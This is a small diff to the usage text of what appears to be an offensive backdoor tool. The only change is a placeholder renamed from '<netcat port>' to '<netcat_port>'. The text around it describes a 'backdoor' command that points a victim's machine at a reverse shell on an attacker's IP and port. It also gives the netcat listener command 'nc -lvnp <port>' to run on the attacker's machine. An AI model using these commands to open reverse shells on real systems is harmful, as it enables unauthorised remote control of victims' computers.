@@ -9,7 +9,7 @@
 ####################################################     BACKDOOR     #####################################################
 ###########################################################################################################################
 
-[+] backdoor <hacker_ip> <netcat port>: Tell the victim where to connect the reverse shell
+[+] backdoor <hacker_ip> <netcat_port>: Tell the victim where to connect the reverse shell
     [*] Open the backdoor (listener) on attacker's machine: nc -lvnp <port>
 
 ###########################################################################################################################
